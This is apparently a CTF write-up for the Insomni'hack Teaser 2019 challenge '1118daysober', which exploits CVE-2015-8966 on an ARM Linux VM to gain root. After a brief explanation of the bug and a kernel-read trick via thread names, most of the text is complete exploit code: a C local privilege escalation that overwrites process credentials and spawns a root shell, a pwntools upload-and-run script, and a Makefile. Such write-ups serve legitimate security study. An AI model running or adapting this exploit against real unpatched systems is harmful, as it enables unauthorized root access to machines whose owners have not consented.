---
title: 1118daysober - Insomni'hack Teaser 2019
date: '2019-01-22 10:48:25'
layout: post
---

> The kernel of [this vm](https://storage.googleapis.com/insomnihack/media/1118daysober_files-d3c498fd492d0b9230827301c3335b5b130e49c0fe5d950fc96ca6c3c6645c94.tar.xz) is vulnerable to CVE-2015-8966, exploit it to gain root privileges and read /flag/flag.txt !
> 
> Terminal  ssh 1118daysober@1118daysober.teaser.insomnihack.ch
> 
> Password: 1118daysober

*158 Pts, 28 solved, pwn*

We are given an arm vm and a CVE number, which after a bit of googling leads us to a nice [writeup and POC](https://thomasking2014.com/2016/12/05/CVE-2015-8966.html) by [ThomasKing2014](https://twitter.com/ThomasKing2014) who discovered the issue.



The summary is that calling `fcntl64` with the right params will call `set_fs(KERNEL_DS)` and never set it back. This allows us to use kernel addresses instead of userland addresses when dealing with syscalls, eg `read(0, (void*)0xc0008000, 8)`will read from stdin directly to the kernel address.



The main problem is that after triggering the bug we can no longer provide userland addresses to the syscalls, so we cannot just use `pipe/read/write` to access and modify the kernel like normal. We can use `pipe` to write from one kernel address to another kernel address though, which will come in handy later on.



After a lot of time messing around with different ways of trying to transfer kernel data to userland, I found that we could use the thread name to transfer data out (so long as there were no null bytes as strcpy is used):

```c
unsigned int read_int(unsigned int kaddr) {
  char buf[0x200] = {0};
  prctl(PR_SET_NAME, kaddr, 0, 0, 0);
  prctl(PR_GET_NAME, buf, 0, 0, 0);
  return *(unsigned int *)buf;
}
```



So now we have all the building blocks, we can read kernel data and overwrite any kernel data with nulls. The plan is to locate the `task_struct` for our process, then find the `cred`, then overwrite the ids with `0` to make us root and spawn a shell. There is no `kaslr` which is nice, but the stack and heap are still randomised. As `init_task` is at a fixed address, we can start there and then walk through the linked list of tasks. In the end our task was almost always at `init_task.tasks->prev` and running it a few times was easier than walking back through the list.



After a couple of runs we get root and can cat the flag:

`INS{KERNEL_DS_make5_life_e4sier}`



exploit.c:

```c
/*
 Based of POC from https://github.com/ThomasKing2014/android-Vulnerability-PoC/blob/master/CVE-2015-8966/poc.c
*/

#define _GNU_SOURCE

#include <fcntl.h>
#include <pthread.h>
#include <semaphore.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

void kwrite(void *kbuf1, void *kbuf2, size_t count) {
  int pipefd[2];
  ssize_t len;
  pipe(pipefd);
  write(pipefd[1], kbuf2, count);
  read(pipefd[0], kbuf1, count);
  close(pipefd[0]);
  close(pipefd[1]);
}

unsigned int read_int(unsigned int kaddr) {
  char buf[0x200] = {0};
  prctl(PR_SET_NAME, kaddr, 0, 0, 0);
  prctl(PR_GET_NAME, buf, 0, 0, 0);
  return *(unsigned int *)buf;
}

unsigned int init_task = 0xC1307080;
unsigned int tasks_prev_offset = 0x1F8;
unsigned int cred_offset = 0x380;
unsigned int kernel_nulls = 0xc0008000;

void exploit() {
  char buf[100] = {0};

  unsigned int task = read_int(init_task + tasks_prev_offset) - 500; // init_task.tasks->prev
  printf("task 0x%x\n", task);

  unsigned int creds = read_int(task + cred_offset); // creds offset
  printf("creds: 0x%x\n", creds);

  if (creds) {
    kwrite((void *)(creds + 4), (void *)kernel_nulls, 0x20);
    setuid(0);
    seteuid(0);
    setegid(0);
    setgid(0);
    system("/bin/sh");
  }
}

__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg) {
  __asm __volatile(
      "swi	0x9000DD\n"
      "mov	pc, lr\n"
      :
      :
      :);
}

#define F_OFD_GETLK 36
#define F_OFD_SETLK 37
#define F_OFD_SETLKW 38

int main(int argc, char const *argv[]) {
  int fd = open("/proc/cpuinfo", O_RDONLY);

  struct flock *map_base = 0;

  if (fd == -1) {
    perror("open");
    return -1;
  }
  map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (map_base == (void *)-1) {
    perror("mmap");
    goto _done;
  }
  memset(map_base, 0, 0x1000);
  map_base->l_start = SEEK_SET;
  if (sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)) {
    perror("sys_oabi_fcntl64");
  }

  exploit();
  munmap(map_base, 0x1000);
_done:
  close(fd);
  return 0;
}
```



pwn.py:

```python
#!/usr/bin/env python2
from pwn import *

def send_command(cmd, print_cmd = True, print_resp = False):
  if print_cmd:
    log.info(cmd)

  p.sendlineafter("/ $", cmd)
  resp = p.recvuntil("/ $")

  if print_resp:
    log.info(resp)

  p.unrecv("/ $")
  return resp

def send_file(name):
  file = read(name)
  f = b64e(file)

  send_command("rm /home/user/a.gz.b64")
  send_command("rm /home/user/a.gz")
  send_command("rm /home/user/a")
  size = 800
  for i in range(len(f)/size + 1):
    log.info("Sending chunk {}/{}".format(i, len(f)/size))
    send_command("echo -n '{}'>>/home/user/a.gz.b64".format(f[i*size:(i+1)*size]), False)

  send_command("cat /home/user/a.gz.b64 | base64 -d > /home/user/a.gz")
  send_command("gzip -d /home/user/a.gz")
  send_command("chmod +x /home/user/a")

def exploit():
  send_file("working.gz")
  send_command("/home/user/a")
  p.interactive()

  # INS{KERNEL_DS_make5_life_e4sier}


if __name__ == "__main__":
  context.terminal=["tmux", "sp", "-h"]
  context.arch = "arm"

  if len(sys.argv) > 1:
    s = ssh(host="1118daysober.teaser.insomnihack.ch", user="1118daysober", password="1118daysober", timeout=5)
    p = s.shell('/bin/sh')
  else:
    p = process("./run.sh", env={}, stdin=PTY, stdout=PTY)


  exploit()
```



Makefile:

```makefile
working: working.c
	./arm-linux-musleabi/bin/arm-linux-musleabi-gcc working.c -o working -static -Os
	arm-linux-gnueabi-strip working
	gzip -fk working
```
